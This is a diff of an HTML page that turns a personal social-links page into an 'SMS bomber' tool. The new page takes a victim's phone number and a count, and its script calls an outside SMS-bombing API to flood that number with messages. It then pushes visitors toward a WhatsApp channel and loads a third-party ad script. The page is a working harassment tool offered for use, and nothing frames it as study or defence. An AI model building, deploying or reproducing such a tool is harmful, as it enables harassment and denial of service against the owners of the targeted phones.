@@ -1,373 +1,677 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NAVEED KHAN- VIP Links</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-    
-    <style>
-        /* Default Neon Theme */
-        :root {
-            /* Default Theme 1: Neon Pink/Cyan */
-            --primary-color: #ff00ff; /* Neon Pink/Magenta */
-            --secondary-color: #00ffff; /* Neon Cyan */
-            --background-color: #0a0a0a; 
-            --card-background: #181818; 
-            --text-color: #f0f0f0; 
-            --shadow: 0 8px 35px rgba(255, 0, 255, 0.8); 
-        }
 
-        /* Base & Background */
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--background-color);
-            display: flex;
-            justify-content: center;
-            align-items: flex-start; /* Aligned to top, not center */
-            min-height: 100vh;
-            margin: 0;
-            color: var(--text-color);
-            background-image: radial-gradient(circle at center, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
-                              radial-gradient(circle at top right, rgba(255, 0, 255, 0.08) 0%, transparent 60%);
-            animation: bgPulse 25s infinite alternate ease-in-out; 
-            overflow-y: auto; 
-            padding-bottom: 50px; /* Space for the bottom */
-        }
+<meta charset="UTF-8">
 
-        /* Dynamic Background Pulse */
-        @keyframes bgPulse {
-            0% { background-size: 100% 100%, 100% 100%; opacity: 0.9; }
-            50% { background-size: 150% 150%, 120% 120%; opacity: 1; }
-            100% { background-size: 100% 100%, 100% 100%; opacity: 0.9; }
-        }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        .container {
-            width: 100%;
-            max-width: 380px; 
-            padding: 20px;
-            text-align: center;
-        }
+<title>NAVEED-KHAN-DIRAJ-BOMBER </title>
 
-        /* THEME BUTTON FIXED/STICKY */
-        #theme-button {
-            position: sticky;
-            top: 20px; /* Distance from the top */
-            z-index: 100; /* Ensure it stays on top */
-            width: calc(100% - 40px); /* Fill container width */
-            
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            color: var(--card-background);
-            border: none;
-            padding: 10px 15px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 1em;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
-            transition: all 0.3s ease;
-        }
-        #theme-button:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 25px var(--secondary-color);
-        }
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-        /* Profile Card - Fixed/Sticky Header (Name/Logo) */
-        .profile-card {
-            /* IMPORTANT CHANGE: Making background transparent and removing box-shadow */
-            background: transparent; 
-            box-shadow: none; 
-            border: none; /* Removing border */
+<style>
 
-            border-radius: 25px;
-            padding: 30px 20px 10px; /* Reduced bottom padding */
-            
-            position: sticky;
-            top: 75px; /* Adjust based on theme button height and margin */
-            z-index: 90; 
-        }
-        
-        /* Profile Card Inner Container for Visuals (Optional - keeps the glow around the card area) */
-        .profile-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: var(--card-background); /* Inner background color */
-            border-radius: 25px;
-            border: 2px solid var(--primary-color);
-            box-shadow: var(--shadow);
-            animation: borderGlow 3s infinite alternate ease-in-out; 
-            z-index: -1; /* Pushes it behind the content */
-            opacity: 0.95; /* Slight transparency to see background glow */
-        }
-        
-        /* Links Container - This wrapper holds all the links */
-        .links-container {
-            /* This margin creates the space below the sticky profile card */
-            margin-top: 15px; 
-            z-index: 80;
-            position: relative;
-        }
+:root{
 
+  --bg:#030003;
 
-        /* Pulsating Border Glow */
-        @keyframes borderGlow {
-            from { border-color: var(--primary-color); box-shadow: 0 0 20px var(--primary-color); }
-            to { border-color: var(--secondary-color); box-shadow: 0 0 30px var(--secondary-color), 0 0 50px rgba(0, 255, 255, 0.3); }
-        }
+  --neon:#FF1744; /* main neon red */
 
-        /* Profile Picture Styles */
-        .profile-pic {
-            width: 110px;
-            height: 110px;
-            background: url('https://ibb.co/fYS7PKww') center/cover;
-            background-color: #333;
-            border-radius: 50%;
-            border: 5px solid var(--secondary-color);
-            margin: 0 auto 20px;
-            box-shadow: 0 0 25px var(--secondary-color); 
-            transition: transform 0.4s ease, box-shadow 0.4s ease;
-        }
-        .profile-pic:hover {
-            transform: scale(1.1) rotate(-5deg); 
-            box-shadow: 0 0 35px var(--secondary-color), 0 0 60px rgba(0, 255, 255, 0.5);
-        }
+  --neon-2:#FF3B5C; /* softer red */
 
-        /* Title & Subtitle */
-        h1 {
-            font-size: 2.3em; 
-            color: var(--text-color);
-            text-shadow: 0 0 12px var(--primary-color), 0 0 25px var(--primary-color);
-            animation: glitch 1.8s infinite linear alternate, flicker 3s infinite;
-        }
+  --glass: rgba(255,23,68,0.04);
 
-        p.subtitle {
-            color: var(--secondary-color);
-            margin-bottom: 20px; /* Reduced margin */
-            font-size: 1.2em; 
-            letter-spacing: 3px; 
-            text-transform: uppercase;
-        }
+  --glass-strong: rgba(255,23,68,0.08);
 
+  --accent: rgba(255,23,68,0.12);
 
-        /* Link Button Base Styling */
-        .link-button {
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            width: 95%; 
-            max-width: 95%;
-            height: 55px; 
-            padding: 0 15px; 
-            margin: 15px auto; 
-            color: var(--text-color); 
-            text-decoration: none;
-            border-radius: 12px; 
-            font-weight: bold;
-            font-size: 1em; 
-            
-            background: var(--primary-color);
-            border: 3px solid var(--secondary-color);
-            
-            transition: all 0.5s cubic-bezier(.25,.8,.25,1);
-            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
-            overflow: hidden; 
-            z-index: 10;
-        }
-        
-        /* Icon Size (Chota/Smaller) */
-        .link-button i {
-            font-size: 1.2em; /* Smaller Icon Size */
-            min-width: 25px; /* Adjusted min-width for placement */
-            text-align: center;
-            color: var(--card-background); 
-            transition: transform 0.5s ease; 
-            z-index: 10;
-        }
+}
 
-        /* Hover States */
-        .link-button:hover, .link-button:focus {
-            transform: translateY(-3px) scale(1.01); 
-            box-shadow: 0 10px 30px var(--primary-color), 0 0 8px var(--secondary-color); 
-            animation: neonTextPulse 1.5s infinite alternate; 
-        }
-        
-        .link-button:hover i, .link-button:focus i {
-            transform: translateX(15px) rotate(5deg); 
-        }
-        
-        @keyframes neonTextPulse {
-            from { text-shadow: 0 0 5px var(--text-color), 0 0 10px var(--primary-color); }
-            to { text-shadow: 0 0 8px var(--text-color), 0 0 15px var(--secondary-color); }
-        }
+/* base */
 
-        /* Text Container */
-        .link-text {
-            position: relative;
-            margin-left: 15px; 
-            text-align: left;
-            flex-grow: 1; 
-            opacity: 1; 
-        }
-        
-        .link-text span {
-            display: block;
-            font-size: 0.8em;
-            opacity: 0.8;
-            font-weight: normal;
-        }
+*{box-sizing:border-box}
 
+html,body{height:100%}
 
-        /* Social Link Overrides (Brand Colors) */
-        .tiktok { background-color: #000; border-color: var(--primary-color); }
-        .tiktok:hover { background: #111; }
-        .tiktok i { color: var(--secondary-color); }
+body {
 
-        .instagram { background: linear-gradient(45deg, #e4405f, #feda75); border-color: var(--primary-color); }
-        .instagram:hover { filter: brightness(1.1); }
-        .instagram i { color: white; }
+  margin: 0;
 
-        .whatsapp { background-color: #25d366; border-color: var(--secondary-color); }
-        .whatsapp:hover { background-color: #128c7e; }
-        .whatsapp i { color: white; }
-        
-        .telegram { background-color: #0088cc; border-color: var(--secondary-color); }
-        .telegram:hover { background-color: #005a8d; }
-        .telegram i { color: white; }
-        
-        .direct-chat { background-color: var(--primary-color); border-color: var(--secondary-color); }
-        .direct-chat i { color: var(--card-background); }
+  background: radial-gradient(1200px 700px at 10% 10%, rgba(255,23,68,0.03), transparent),
 
-        .helping-zone { background: var(--card-background); border: 3px solid var(--primary-color); color: var(--primary-color); }
-        .helping-zone:hover { background: var(--primary-color); color: var(--text-color); }
-        .helping-zone i { color: var(--primary-color); }
-        .helping-zone:hover i { color: var(--card-background); }
+              radial-gradient(800px 500px at 90% 80%, rgba(255,59,92,0.02), transparent),
 
+              var(--bg);
 
-    </style>
+  color: var(--neon);
+
+  font-family: 'Share Tech Mono', monospace;
+
+  display: flex;
+
+  align-items: center;
+
+  justify-content: center;
+
+  overflow: hidden;
+
+  position: relative;
+
+}
+
+/* canvas rain behind everything */
+
+#matrix {
+
+  position: absolute;
+
+  inset: 0;
+
+  z-index: 0;
+
+  display: block;
+
+}
+
+/* vignette + CRT + subtle noise */
+
+body::before{
+
+  content:"";
+
+  position: absolute;
+
+  inset: 0;
+
+  pointer-events: none;
+
+  background:
+
+    radial-gradient(circle at 50% 50%, transparent 40%, rgba(0,0,0,0.6) 100%),
+
+    repeating-linear-gradient(0deg, rgba(0,0,0,0) 0px, rgba(0,0,0,0.02) 2px, transparent 4px);
+
+  mix-blend-mode: multiply;
+
+  z-index: 5;
+
+  opacity: 0.85;
+
+}
+
+/* subtle scanlines overlay */
+
+body::after{
+
+  content:"";
+
+  position: absolute;
+
+  inset: 0;
+
+  background: repeating-linear-gradient(
+
+    to bottom,
+
+    rgba(255,23,68,0.02) 0px,
+
+    rgba(255,23,68,0.02) 1px,
+
+    transparent 1px,
+
+    transparent 3px
+
+  );
+
+  z-index: 6;
+
+  pointer-events: none;
+
+  animation: scan 4s linear infinite;
+
+  mix-blend-mode: screen;
+
+}
+
+/* container (foreground card) */
+
+.container {
+
+  position: relative;
+
+  z-index: 10;
+
+  width: min(420px, 92%);
+
+  padding: 36px;
+
+  border-radius: 14px;
+
+  background: linear-gradient(180deg, rgba(255,23,68,0.02), rgba(0,0,0,0.35));
+
+  border: 1px solid rgba(255,23,68,0.12);
+
+  box-shadow: 0 0 60px rgba(255,23,68,0.06), 0 20px 60px rgba(0,0,0,0.6), inset 0 0 40px rgba(255,23,68,0.02);
+
+  text-align: center;
+
+  overflow: hidden;
+
+}
+
+/* extra glow ring behind card */
+
+.container::before{
+
+  content:"";
+
+  position: absolute;
+
+  inset: -12%;
+
+  z-index: -1;
+
+  filter: blur(28px);
+
+  background: conic-gradient(from 180deg at 50% 50%, rgba(255,23,68,0.06), rgba(255,59,92,0.04));
+
+  opacity: 0.9;
+
+}
+
+/* Heading - typing + glitch + flicker */
+
+h1 {
+
+  margin: 0 0 18px 0;
+
+  font-size: 1.9rem;
+
+  color: var(--neon);
+
+  text-shadow:
+
+    0 0 6px rgba(255,23,68,0.95),
+
+    0 0 18px rgba(255,59,92,0.7),
+
+    0 0 28px rgba(255,23,68,0.35);
+
+  letter-spacing: 1px;
+
+  position: relative;
+
+  display:inline-block;
+
+  padding: 6px 12px;
+
+  border-radius: 6px;
+
+  background: linear-gradient(180deg, rgba(255,23,68,0.01), transparent 40%);
+
+  animation: flicker 3.8s infinite linear;
+
+  overflow: hidden;
+
+}
+
+/* glitch slices */
+
+h1::before, h1::after{
+
+  content: attr(data-text);
+
+  position: absolute;
+
+  left: 0;
+
+  top: 0;
+
+  width: 100%;
+
+  overflow: hidden;
+
+  clip-path: inset(0 0 0 0);
+
+  opacity: 0.85;
+
+}
+
+h1::before{
+
+  color: var(--neon-2);
+
+  transform: translate(2px, -2px);
+
+  text-shadow: -2px 0 6px rgba(255,23,68,0.6);
+
+  mix-blend-mode: screen;
+
+  animation: glitch-1 2.2s infinite linear;
+
+}
+
+h1::after{
+
+  color: #FF8A9A;
+
+  transform: translate(-2px, 1px);
+
+  opacity: 0.7;
+
+  mix-blend-mode: screen;
+
+  animation: glitch-2 2.5s infinite linear;
+
+}
+
+/* typing cursor effect (thin) */
+
+h1 .cursor {
+
+  display:inline-block;
+
+  width:2px;
+
+  height:1.05em;
+
+  background: var(--neon);
+
+  margin-left:8px;
+
+  vertical-align:middle;
+
+  animation: blink-c 0.9s steps(2,end) infinite;
+
+  box-shadow: 0 0 8px var(--neon), 0 0 20px rgba(255,23,68,0.6);
+
+}
+
+/* inputs */
+
+input{
+
+  width: 90%;
+
+  padding: 12px;
+
+  margin: 10px 0;
+
+  border-radius: 6px;
+
+  border: 1px solid rgba(255,23,68,0.16);
+
+  background: rgba(0,0,0,0.55);
+
+  color: var(--neon);
+
+  font-size: 0.98rem;
+
+  outline: none;
+
+  text-align: center;
+
+  box-shadow: 0 6px 18px rgba(0,0,0,0.6), inset 0 0 12px rgba(255,23,68,0.02);
+
+  transition: box-shadow .18s ease, transform .12s ease;
+
+  text-shadow: 0 0 6px rgba(255,23,68,0.25);
+
+}
+
+input:focus{
+
+  transform: translateY(-2px);
+
+  box-shadow: 0 10px 30px rgba(255,23,68,0.12), 0 0 26px rgba(255,23,68,0.06), inset 0 0 22px rgba(255,23,68,0.03);
+
+}
+
+/* button - pulse + invert hover */
+
+.btn {
+
+  padding: 12px 26px;
+
+  margin-top: 12px;
+
+  background: transparent;
+
+  border: 1px solid var(--neon);
+
+  color: var(--neon);
+
+  cursor: pointer;
+
+  font-weight: 700;
+
+  font-size: .95rem;
+
+  border-radius: 6px;
+
+  text-transform: uppercase;
+
+  letter-spacing: 1px;
+
+  transition: all .18s ease;
+
+  box-shadow: 0 6px 30px rgba(255,23,68,0.06), inset 0 0 14px rgba(255,23,68,0.02);
+
+}
+
+.btn:hover{
+
+  background: var(--neon);
+
+  color: #0b0007;
+
+  transform: translateY(-3px) scale(1.02);
+
+  box-shadow: 0 18px 60px rgba(255,23,68,0.14), inset 0 0 30px rgba(255,255,255,0.02);
+
+}
+
+/* whatsapp link style */
+
+.whatsapp-link{
+
+  display:flex;
+
+  justify-content:center;
+
+  gap:8px;
+
+  align-items:center;
+
+  margin-top:14px;
+
+  color:var(--neon);
+
+  text-decoration:none;
+
+  font-weight:700;
+
+  transition: all .14s;
+
+  border-radius:6px;
+
+  padding:6px 8px;
+
+  width: fit-content;
+
+  margin-left:auto;margin-right:auto;
+
+}
+
+.whatsapp-link:hover{
+
+  background:var(--neon);
+
+  color:#120006;
+
+  box-shadow: 0 12px 40px rgba(255,23,68,0.12);
+
+}
+
+/* result */
+
+.result{
+
+  margin-top:14px;
+
+  min-height:40px;
+
+  border:1px solid rgba(255,23,68,0.12);
+
+  padding:10px;
+
+  border-radius:6px;
+
+  color:var(--neon-2);
+
+  background: linear-gradient(180deg, rgba(255,23,68,0.015), rgba(0,0,0,0.22));
+
+  font-style: italic;
+
+  text-align:center;
+
+  white-space:pre-wrap;
+
+  box-shadow: inset 0 0 12px rgba(255,23,68,0.02);
+
+}
+
+/* overlay */
+
+.overlay{
+
+  position: fixed;
+
+  inset:0;
+
+  display:none;
+
+  align-items:center;
+
+  justify-content:center;
+
+  z-index:50;
+
+  background: rgba(3,0,3,0.9);
+
+}
+
+.overlay-content{
+
+  padding:28px;
+
+  border-radius:12px;
+
+  border:1px solid rgba(255,23,68,0.12);
+
+  background: rgba(0,0,0,0.7);
+
+}
+
+/* helper micro-animations */
+
+@keyframes scan{
+
+  0%{transform:translateY(-0%)}
+
+  100%{transform:translateY(100%)}
+
+}
+
+@keyframes blink-c{
+
+  0%{opacity:1}
+
+  50%{opacity:0}
+
+  100%{opacity:1}
+
+}
+
+@keyframes flicker{
+
+  0%,10%,50%,100%{opacity:1; filter: drop-shadow(0 0 14px rgba(255,23,68,0.9))}
+
+  11%,14%{opacity:0.85; filter: none}
+
+  51%,53%{opacity:0.92; filter: drop-shadow(0 0 8px rgba(255,23,68,0.6))}
+
+}
+
+/* glitch masks */
+
+@keyframes glitch-1{
+
+  0%{clip-path: inset(0 0 0 0); transform: translate(2px,-2px) skewX(-2deg)}
+
+  7%{clip-path: inset(4% 0 65% 0); transform: translate(-8px,2px) skewX(6deg)}
+
+  14%{clip-path: inset(12% 0 45% 0); transform: translate(6px,-2px) skewX(-3deg)}
+
+  21%{clip-path: inset(0 0 0 0); transform: translate(2px,-2px) skewX(-2deg)}
+
+  100%{clip-path: inset(0 0 0 0); transform: translate(2px,-2px)}
+
+}
+
+@keyframes glitch-2{
+
+  0%{clip-path: inset(0 0 0 0); transform: translate(-2px,1px) skewX(1deg)}
+
+  9%{clip-path: inset(60% 0 8% 0); transform: translate(10px,-6px) skewX(-6deg)}
+
+  18%{clip-path: inset(22% 0 55% 0); transform: translate(-6px,2px) skewX(3deg)}
+
+  26%{clip-path: inset(0 0 0 0); transform: translate(-2px,1px)}
+
+  100%{clip-path: inset(0 0 0 0); transform: translate(-2px,1px)}
+
+}
+
+/* responsive */
+
+@media (max-width:420px){
+
+  .container{padding:22px}
+
+  h1{font-size:1.6rem}
+
+  input{font-size:.95rem}
+
+}
+
+/* tiny footer pulse */
+
+.footer-hint{
+
+  margin-top:12px;
+
+  font-size:0.8rem;
+
+  color: rgba(255,23,68,0.7);
+
+  text-shadow: 0 0 6px rgba(255,23,68,0.06);
+
+  opacity:0.95;
+
+}
+
+</style>
+
 </head>
+
 <body>
 
-    <div class="container">
-        
-        <button id="theme-button">🎨 Change Theme</button>
+<!-- WhatsApp Overlay -->
 
-        <div class="profile-card">
-            <div class="profile-pic"></div> <h1>NAVEED KHAN DIRAJ</h1>
-            <p class="subtitle">VIP Social Links</p>
-        </div>
-        
-        <div class="links-container">
-            <a href="https://tiktok.com/@naveednaveedkha367" target="_blank" class="link-button tiktok">
-                <i class="fab fa-tiktok"></i>
-                <div class="link-text">
-                    TikTok ID 
-                    <span>@naveednaveedkha367</span>
-                </div>
-            </a>
-            
-            <a href="https://www.instagram.com/naveed12567845?igsh=MTBoaHZobGZtcnQyMw==" target="_blank" class="link-button instagram">
-                <i class="fab fa-instagram"></i>
-                <div class="link-text">
-                    Instagram Profile 
-                    <span>@naveedkhan0045</span>
-                </div>
-            </a>
-            
-            <a href="https://chat.whatsapp.com/D6GrrqR6MheHOhl0pUbmTg?mode=ems_copy_t" target="_blank" class="link-button whatsapp">
-                <i class="fab fa-whatsapp"></i>
-                <div class="link-text">
-                    Official WhatsApp Group
-                </div>
-            </a>
-            
-            <a href="https://whatsapp.com/channel/0029VbAr5ok5Ejxvy68GKN0G" target="_blank" class="link-button whatsapp">
-                <i class="fab fa-whatsapp"></i>
-                <div class="link-text">
-                    WhatsApp Channel
-                </div>
-            </a>
-            
-            <a href="https://t.me/khanallhacking" target="_blank" class="link-button telegram">
-                <i class="fab fa-telegram-plane"></i>
-                <div class="link-text">
-                    Telegram Channel
-                </div>
-            </a>
-            
-            <a href="https://wa.me/923346463559?text=𝐇𝐄𝐋𝐋𝐎%20ヾ😊ﾉﾞ%20𝐒𝐈𝐑%20𝐍𝐀𝐕𝐄𝐄𝐃%20𝐊𝐇𝐀𝐍" target="_blank" class="link-button direct-chat">
-                <i class="fab fa-whatsapp"></i> 
-                <div class="link-text">
-                    Direct WhatsApp Chat
-                    <span>+923346463559</span>
-                </div>
-            </a>
-            
-            <a href="https://chat.whatsapp.com/BGv4tOPs61v6mkleOT3jrz?mode=ems_copy_t" target="_blank" class="link-button helping-zone"> 
-                <i class="fas fa-hands-helping"></i> 
-                <div class="link-text">
-                    HELPING ZONE GROUP
-                </div>
-            </a>
-            
-        </div>
+<div class="overlay" id="whatsappOverlay">
+
+    <div class="overlay-content">
+
+        <a href="https://whatsapp.com/channel/0029VbAr5ok5Ejxvy68GKN0G" target="_blank">
+
+            <i class="fab fa-whatsapp"></i> JOIN FOR MORE
+
+        </a>
+
+        <div class="close-overlay" onclick="closeOverlay()">Close</div>
+
     </div>
 
-    <script>
-        const root = document.documentElement;
-        const themeButton = document.getElementById('theme-button');
-        let currentThemeIndex = 0;
+</div>
 
-        // 12 Dual-Color Schemes (Primary, Secondary)
-        const themes = [
-            // 1. Neon Pink / Cyan (Default)
-            ['#ff00ff', '#00ffff'], 
-            // 2. Neon Green / Blue
-            ['#39ff14', '#1e90ff'], 
-            // 3. Gold / Dark Red
-            ['#FFD700', '#DC143C'], 
-            // 4. Deep Purple / Lime Green
-            ['#6A0DAD', '#CCFF00'], 
-            // 5. Fire Orange / Aqua
-            ['#ff4500', '#00FFFF'], 
-            // 6. Royal Blue / Gold
-            ['#4169E1', '#FFC300'], 
-            // 7. Light Pink / Lavender
-            ['#FFB6C1', '#E6E6FA'],
-            // 8. Electric Yellow / Black
-            ['#FFFF33', '#000000'],
-            // 9. Teal / Coral
-            ['#008080', '#FF7F50'],
-            // 10. White / Grey
-            ['#FFFFFF', '#D3D3D3'],
-            // 11. Blood Red / White
-            ['#8B0000', '#FFFFFF'],
-            // 12. Ocean Blue / Deep Green
-            ['#00CED1', '#006400'],
-        ];
+<!-- Main Container -->
 
-        function applyTheme(primary, secondary) {
-            root.style.setProperty('--primary-color', primary);
-            root.style.setProperty('--secondary-color', secondary);
-            // Profile picture border and glow update automatically
-        }
+<div class="container">
 
-        function changeTheme() {
-            currentThemeIndex = (currentThemeIndex + 1) % themes.length;
-            const [primary, secondary] = themes[currentThemeIndex];
-            applyTheme(primary, secondary);
-        }
+    <h1>NAVEED-DIRAJ-BOMBER DANGER </h1>
 
-        // Event listener for the theme button
-        themeButton.addEventListener('click', changeTheme);
+    <input type="text" id="number" placeholder="Enter number e.g. 923XXXXXXXXX">
 
-        // Apply initial theme
-        applyTheme(themes[0][0], themes[0][1]);
-    </script>
-</body>
-</html>
+    <input type="number" id="amount" placeholder="Enter amount" min="1" max="10">
+
+    <button class="btn" onclick="sendSMS()">
+
+        <i class="fas fa-paper-plane"></i> Send SMS
+
+    </button>
+
+    <!-- Result box initially empty -->
+
+    <div id="result" class="result"></div>
+
+    <a href="https://whatsapp.com/channel/0029VbAr5ok5Ejxvy68GKN0G" target="_blank" class="whatsapp-link">
+
+        <i class="fab fa-whatsapp"></i> Join Our WhatsApp Channel
+
+    </a>
+
+</div>
+
+<script>
+
+// Close overlay
+
+function closeOverlay() {
+
+    document.getElementById('whatsappOverlay').style.display = 'none';
+
+}
+
+// SMS Bomber function
+
+async function sendSMS() {
+
+    const number = document.getElementById('number').value.trim();
+
+    const amount = document.getElementById('amount').value.trim();
+
+    const resultDiv = document.getElementById('result');
+
+    if(!number || !amount){
+
+        alert("Please enter both number and amount");
+
+        return;
+
+    }
+
+    // Clear result immediately
+
+    resultDiv.textContent = "";
+
+    try {
+
+        await fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`);
+
+        // Show message after SMS sent
+
+        resultDiv.textContent = "SAND YOUR BOMBER 👄PLESE FOLLLOW MY CHANNEL👇";
+
+        // Show WhatsApp overlay only after sending SMS
+
+        document.getElementById('whatsappOverlay').style.display = 'flex';
+
+    } catch (error) {
+
+        resultDiv.textContent = "SAND YOUR BOMBER 👄 PLESE FOLLLOW MY CHANNEL👇";
+
+        document.getElementById('whatsappOverlay').style.display = 'flex';
+
+        console.error(error);
+
+    }
+
+}
+
+</script>
+
+<script type='text/javascript' src='//pl26635370.revenuecpmgate.com/0d/d6/68/0dd66892ae1350e1c2ac63bd9e54e111.js'></script></body>
